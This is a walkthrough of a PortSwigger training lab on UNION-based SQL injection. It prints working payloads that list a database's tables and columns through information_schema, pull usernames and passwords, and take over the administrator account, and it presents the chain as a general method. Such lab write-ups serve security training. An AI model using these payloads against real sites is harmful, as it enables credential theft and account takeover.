# Lab 09 — SQL Injection Attack: Listing the Database Contents on Non-Oracle Databases

**Difficulty:** Practitioner
**Technique:** UNION-based SQLi — full database enumeration using information_schema
**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

---

## Vulnerability

The product category filter is vulnerable to UNION-based SQL injection. This lab combines everything learned so far into a complete attack chain — starting from confirming the injection, through full database enumeration, to credential extraction and account takeover. No table names or column names are provided — everything must be discovered through systematic querying.

---

## Steps Taken

1. Confirmed SQLi and established that the query returns 2 text-compatible columns
2. Queried `information_schema.tables` to list all tables in the database
3. Identified a table with a name suggesting user credential storage
4. Queried `information_schema.columns` to find the column names inside that table
5. Extracted usernames and passwords from the identified table using a targeted UNION query
6. Used the administrator credentials to log in and complete the lab

---

## Payloads Used

### Step 1 — List all tables
```
?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

**What this does:**
- `information_schema.tables` is a system table available in MySQL, MSSQL, and PostgreSQL
- `table_name` column contains the name of every table in the database
- The application returns all table names in the response disguised as product data

**Response reveals something like:**
```
users_abcdef
products
orders
```

### Step 2 — List columns in the target table
```
?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

**What this does:**
- Queries `information_schema.columns` filtered to the specific table
- Returns all column names — revealing which ones hold usernames and passwords

**Response reveals something like:**
```
username_hjkl
password_mnop
```

### Step 3 — Extract credentials
```
?category=Gifts'+UNION+SELECT+username_hjkl,password_mnop+FROM+users_abcdef--
```

**What this does:**
- Targets the specific table and column names discovered in Steps 1 and 2
- Returns all usernames and passwords directly in the application response

---

## The Full Attack Chain

```
Confirm SQLi
    ↓
Determine column count (ORDER BY)
    ↓
Find text-compatible columns (NULL probing)
    ↓
List all tables (information_schema.tables)
    ↓
Identify target table
    ↓
List columns (information_schema.columns)
    ↓
Extract credentials
    ↓
Login as administrator
```

This is the complete methodology for UNION-based SQL injection on non-Oracle databases. Every step builds on the previous one.

---

## information_schema Availability

| Database | information_schema available |
|----------|----------------------------|
| MySQL | Yes |
| MSSQL | Yes |
| PostgreSQL | Yes |
| Oracle | No — uses all_tables and all_columns instead |

---

## Real-World Impact

This lab demonstrates the full end-to-end impact of SQL injection:
- Complete exposure of the database structure — every table, every column
- Extraction of all user credentials in plaintext or hashed form
- Administrator account takeover
- From a single vulnerable input parameter — the category filter — a full application compromise is achieved

In a real assessment this would be documented as a Critical severity finding with immediate remediation required.

---

## Key Takeaway

`information_schema` is the roadmap to any non-Oracle database. Once you have UNION injection, the path to full credential extraction is always: tables → columns → data. This three-step enumeration pattern is fundamental to SQL injection exploitation and appears in almost every real-world SQLi scenario.
